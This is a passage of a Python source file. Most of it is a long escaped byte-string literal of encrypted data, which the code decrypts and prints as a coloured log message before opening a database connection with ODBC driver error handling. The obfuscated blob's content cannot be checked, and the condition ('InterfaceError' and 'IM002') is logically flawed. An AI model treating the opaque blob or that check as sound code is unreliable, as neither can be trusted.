99\xc4\x90v\x97t\xeb\x12w\xd1_J\x9f\x06\xa5\x14\xe9\xdf\xf8\x06\xd9\xb9"c\x95\xb01\x85\xcb\xf1\xf8\xe2c\x0c<\x18\xfd\xfek\x93d\xa5\x1a#\x1a\x1d3}\n\xb0\xab\xb6$+\x058\x8f}\x114\xfb\xa1\xd5\xf8Y\xb8Wv\xc6\xe3^\xf2)\xc4\xc9\x91\xa0g\xf3\xf6~;\x9c{Zr\x9a\x8a\xa0\x85\x07e\x0e\xc7asq,\x0f\x1c\x964$\x0b\x14\x9c\x01>\xf0]8A=\x1a\t\xd9\x1f\xe6\xa5\x0cN\x8aK\xd5\x82\x80\x10~\x05\\\xc9\xe4\x8f\xec\x90\xeb\x15R4\x04\xa1\xa2[\x88\xde\xa7\x06\xd9\xf5y>#\xf6\x9bX\xc0a\xe6\xe4\x0cd\xfb\x87\x13\x838B\x18\x8c\x9b\x10N\xa1R[ci\xe4\xf1\xad\xe5\x0f\xc9I\xaa\xed\x96\x87`\x04$@\xc4/\xab4\'\x01S\xe5\x8d\xb3`7\xd4Z\x1f\x01\xed\xc8\xb2S\xdc\xa4\xae\xab\xde\x8d\x0b`\xb1S\xca\xc1\x81\xfa\x9b\xb3V\xed`\xf0q\xd1\x93\xe8*\xe2\xa9\xc33#9\x82u\\D\x04\x82iv\xcd\x18\x948*\xaa\xdc*Lg\xa3\xb2\x18\x1c\xdd\x17\xa3Qf)\x03\xadM\x87\x8f|\x9c\xb8\xce\xf0\xc1\xb8\xb9\xdc\x02\xdf\x96\xc1lN\x90\xd0\x89\xfa2\xc9\x17C)\xf4\x95\xa0C\xc0\xd5\x1dr\x83&\xe9\xb4\xa4M-GbH<\xd6\xee\xb09\x9b\xdc?n\x18\xdc\xce<d\x96\xc3\xd0s%\x9f\xef\xd8\xa9\xc1\xe1\xf8n}#w\x90\x164\xda\xabsBk8|\x00\x1f.\x06\xc8T`\xeat\x91\xcb\xb4R\x98\xee;F\x8a(\rSg\xe7m\xa3\xbcC\x0b\x0f\x82@\xc1OR\x95\x04\x85\x10\xf0p<\x8aL\xcbe\xd7\xe22qxF4\xd7\xf5\xdej\x0f\x82x9/y\xa3C\x03\x1ez\xe2D\xdfw@\x19R/-7\xa0\x19\xa4\xa3-dJ\xf2\xb8\x02\x8c\xbc\x89\xd2\x84\xfe\x06{\x9e\xe0\xa4\x0e\x08(\x94\x99\x92i;\xff\x00\x8b\xbb\xcd\x93\xddK\xb2-\xe8\xae\x1cp#\xee\xc3\xb5G)\xe2o\xdb;\x01v\xe1\x12\xfc\x99\xc0"&\xc5f\x96E\x07&\xae\x15S\x14l\x95\x89\x0b\xfbN\xd2RQ/\xc3c\xaf\x10\xa0AOCR\xf5dG\xd1\x19\x07\xb3s\xe8\x02\xce\x99\xc8\xc7_\xf7\x13\x87\x80i\x1c\xcc\xaa\x86{\x16\xbc\x8f\xafC\xb6O\x1f\xe09\xc5\xbd\xa7\xd3\x1f\x8cH\xbe0\xda\x008\xb7I;\xa2\xec\x05-y\xcaJU\n*\xb4\x1d\x1a\xac\xe0\x9fD\xd1\x1c\x8f9T\xbb\xca\x9f\xc6<\xe6\\\r\x960\xef`\xa3w\r\x87\x91\xf3\xb9\x87\xe3\xb4.O\xd1\xe0\xcd\x0e\xa7\x07\xc4\xc5J\x88\x899\xe4\xad\xeb\xf4\x85\n2@[\x96$\xb3\x16\x80\xf8m\x8b\xbf\xe0K\x08\x14\x99\xd1E\xd7\x1a\x811\x9a\x8c\xcc\x8a@\xb7R\xa1EG\xb2\xa4\xbb\xb8R\xb4\x83\xef\x1b-UT\xce\xe3\x9c\x81\xd4M\x12\x89\xf9!\x81c\x7f\x8e\x16\xb7\xd9\xa0\xf8F%Z&8\xcab\n\x87\xef\x9e\x00\x81\x89\x1e\xc7\xff\xa2\x1c0\x8e\x19\xfbS\x7f\xde\xcc.46\xedp\xc5\xe2J!\xdb\x0c\x86n\xeaL\x9a\x04\x8d0\x0c\xfbg\x8b:V\xde\x1d\xac\x8d\x85\x077\x8c^\xe73I>#\xd4:D\xe3#\'\xfc$\xa9\x83\x97\xe5\xdc\xa7\x97\xfc$F\xf5B\xb9\x00\x1a\xb4l:\xcef\xb6Y1\xb9=>v\xd2\x85\x02\x10\xdc\xd16\xd3c\x1a\x992\xc9\x10\x89{Gd,\x8c\xb9\xceD\xa2\xe05\xfbi\xd7\x9c\x03\xd8\x80\x10`\x00F\xcb\x17\xe3\x884\x04F#B)3\xe1x\xf7\xf3_lQ\xc4\xa7\x8d\xc0\xf4&\x8c\xab\x1f5I\x9a\x84\x9e\xb6\xab\x8b\xcc\x02qN!\xff\xa9\xd12\xe296\x10\x90\x17h\x0c\xee\xbe\xe5{\xd4\x1a\x830=\xe7\xc0\x04\xb9\xce\xf88\xa0\x1d\x1cTE\xe9]\xaa\xcb\x17\x1b\xce\x97\x8b}\xef\x1a\x9c\xd5V\xff\xd7\xad\xa0D\xdbpO\x10\xd2\x12g\xea\x87o>\x91\x1ek\xe9\x16\xf0 \x00\x1b\xbb\xc0\xe9\x03\xd0\xfa\xa3\x07byX\xbb\xa5)\xea[\xa6\xd5\x07\xa8\x13\x04\xc4\xee\xe7\'\xa7\xa1\xe59\xca \xe4\xa9\x83&B\xc6\xad\x99\x16\x0e\xd9\x98\xc8\xf8p\xbf\x96\xfd@j\x1b\x07\x88`fY\xfa\xfb\xb6\xb5\xd7a\x07z\xd8\xbeT\xa6u\rc\xa6\xf4\xf2\xe9&\x9ed\xbb\xcc\xd40\xf6\xa9\xbfrN*4\xc4\x10^\x87E\xbcp\xf5Ir\x14\xbf@\xe1\xb4O\x96\n\xb8\xd1\x11\xc4\x93\xc9v\x92\x0b\xf4\xf2eY\x06\x0f\xf6V\xb4R\xd8\xa4\'\x8c\t\x89\xd8\x0c-Sls;e1\xe9\xfd\x07\xfe\x08jf\xdd&2\xd9C\xe3Dkd\xbd\xf2s\x92\x91\xde.z?\xac^\xa7/\xee\xa3\xed\xa4`\xdb/\xa9^\x84v\xa6\xcf\xc6\xdcU\xce\xf9\xaa\x16\xban\xf3\x15\xcb\xdc\x06\xe5\ta\x16\xf3\x13A\x9cj\xe33ZDb\xb4I\x0f\xc6x\xc4\xe7\xd2\x9e\xa9\xbc#\xberJL\r$T\xbe\x14o\x92\nd\xf4\x90\xa3\x8b\x9e<\x9d\x0c\x80\x85\x98\xcfW\xeb\xd4\x12\x9c\xf1o\xc8p\xde\x0fJO\xa9\xa0}t9}E\xdc3?\xda9\xcb\x92\t\xc6\xdf\xdcS\\\x7f\x10|\x95\xdc\x0e\xf5q\x9f\xb2\x01E\x08k\x13\xd3F\xc0;\xaeY\x87\x1e\xc2\x02\xd9\x1a\x0e\x17\x03}\x0f\x1b:\x1fE\xfb56\xa2\xb2-\xb3i\x04\xdf\xbd5\xf9\xec xB\xbb}t\xf2\x1f%<\xa4\xc2\xfc+]\t\xcf\x08\x86\xabIVvWy\x84\x9f\xc9\xa9\x0c0\x87.;\xce\x17\x93\x94\xadT_\x8c#*\xc2\ns\xfah&h1\x16j*\xf8\xcb\xbd#(2\xb8)\xb2\xd2K/\x99qyv\xceb\xc9i\xb0>x@M}\x8f\x83\x91\xb2\x92\xbd(\xc9\xa9\xaetf\xa3\xb2\x9f\x94*\tX\xd3e\xe3=/;k$n\x9f\xcde/xx\xbd\xbe\xe4p\x01\xc4=\x16&\t(^\xac* N\x01\x01S\x06\x1c7\x94\x1e\xba\x05\xfai\xb6\xe5\xa7@\x1a_\xf4\x0b|\xa2\x85\x86\xf9\x9f\xc2|\xd6\xa07C7d~w|\xdb\xf6\x04\xe4\xf3\n?N\x97\x01^3\xefO\xb9S\xdb\xa9\xae\xdb\x96\x1f\x05\xdd2\xa1T\x05A\x15\x88\xe7\x18\xcat\t>\x03`\xa1\xd5\x1f\x99^\xb7\xe1\xed\x85K\x13\xf5HW\x0el\x90V\xd7\xeb5\x1f\xe83\xc7\x0f\x85\xa4\x80\xda\xfa\xc6=\xfa\x0ct<\xdaA\x8f\x95\xc62$\xb3dE\x02\xf6\x98\xe2\x15\xa9\x85\xab\x11C\xc0j\xafi\x92\n\xb1I\x85.\x1bC\xd0Z\x02\xe6\x08\x03*D\xc3\x87\xd3\xe8\x17T\x00\x8b~\xf9\xe8\xad\t\xe7.~H\xb2M\xb5\x97b}f\x88\xa7&DhT[\xaf\xa2\xf7\xf26\xa0\xa1-\x82\x06\xad\x80a1\x99"{\'\x92y\xbbf\xe5\xb4\x05bD\xb9\xa0*&\xe3\xb6p\xbf"W\xe3\xecy\xf8\x8c\x9c\xa9\x7f\x02\xd4me\xd0#\xba\xb5i\xe0\xfb\x8f\xb2\xe2*\xd2S\xbb\xdc^%~\xd4\xa8\xb9*\xeai\xbb\x02S\x08\xa4\x85^\xef\x03\x00\xc0\x17\x01"\xe6\x03\xef\xf0\xf9|F\xe5\x8e\xd6\x895\x97$\xf2\x15_\x86\xe6\x1e\xfa\x87\xbf\x85\xaf\x87\x87)\xc4\x1f\x1b\x86]\x82K*\xe0U\xb7\xce\x9d\xdc\xe8\x0b\xcf\x8e,\x9bC\x80\x11)SV\xb0W\nPW\x0f\x10,\x03\x93\x15\x1e\x8f\xae]8\xd57[\xff\xc3\xe3\xc5opc\xb9\x10\xc0\xa1e;&U\xcd{i\xfa<\xa9\xc2jL\x0b\x18\xb6&\x19\x12d\xbdj\x89\xed\xce\xc98\xad\xb1\xa4\xbf\xc9\xf0\x84\xd5\xdcY{I\xda\xd9\x1ei\x8dl8\x1f\xde\xd3:y\xbd\xe9c_\x08K\x05)H\n\xe9-\xa9\x9c\xf5\x7f\x1db\xcbj1\x9b@\x90\xdf\xff\xc8(\x8f\xd8k8\xaa\xa7\x95t\x1d\xb0\xc3\x96\x85\xa3\x00\xbaZ\xcc\x19\xea\xbc\x96\x08~\xd4a]\x980\xd9\xb6I\xf7\xe7\xf5g%\xeap\xf9\xb6\xfaqGpX\xe8\xb3\xf5_\xd3\'\x1d\xc2\xd9\x12\xa6\x84\xa9k\x00o\xf6~%\xe4\x1e\xf2xt\x8daz\xce\xa0s\xd1$\r\x05\x00\xee\x08-\x12\xa6b\x16\xa1\x1a\x04\xf0k3|\x08\xe9\xf6\x050\x88\rKA\x91\xf8\xaesG\'\x14j\xbat\xf5V\xcf\xb5_\xc2-\xb9-\xb3\x94wW9\xfd\xee\xd6\xd4\xaa\x1f\x823\xe5\xbdV\x8e\xac\xd7{\xe9\x08V\xb4\x0c\xc9\xb2\x94\xd9z\xa3Wz\x86\xa6\xd20>g\xd3\x05\xe2%\xf39I\xffjs4\xaf\xf7g\x06X\xfdc\x91\t\xf3DM|\xf3\xb3\x9aL\x8f\xe1O\x8dJ\x11\x81\xb8Hc( \x10V\x17nq[`r\x07P\x04\x8e\xc07\xb0\xa2\x11\x0e1\x1ff\xdf\xfa\xf3/\n9\xc4\xf7&\x9e\x10\x88\xd1\x12\x15r\x19t\x9e7-\xf46\xe2?\xda\x04\xbe\xd8\xf4\x04\x8d>`@a1C@9\x1f\xbd\xcc\xf8\xd5s[\xe18\xe5X\x87\xb5u\xdb\x02\xd4Wr\xf6\xc0\xe7\xa2\x11\xec\x9d$|B`7\x8e5\x8ccb\xa5;f\xdb\xed\xe7\xec\x0b\x07\x9btJ\xb0\x84\x02\xb6\x8a\x93\xb9k\xc4\xec[P\xfd\xb8\xed\x11\xe5\xa1a\xd7\xba\xf9W\xcf\x7f\\1\xf7xR\xe3\xe6'
        log = CryptoCarry.Hex(self.LOG,demode=3).decrypt()
        print(CryptoCanvas.Print.cyan()+log+CryptoCanvas.Print.attr(0))
        try:self.cnxn, self.crsr = FlushEcho().CaseOTC(EC,NARRAY,Crypts)
        except:
            Error = traceback.format_exc()
            if ('InterfaceError' and 'IM002') in Error:
                Msg : list = []
                Msg.append('%sInterfaceError:%s' % 
                    (
                        CryptoCanvas.Print.green(),CryptoCanvas.Print.attr(0)
                    )
                )
                Msg.append('%sPlease install the driver first ^^%s' % 
                    (
                        CryptoCanvas.Print.green(),CryptoCanvas.Print.attr(0)
                    )
                )
                print(''.join(i for i in Msg))
                os._exit(0)
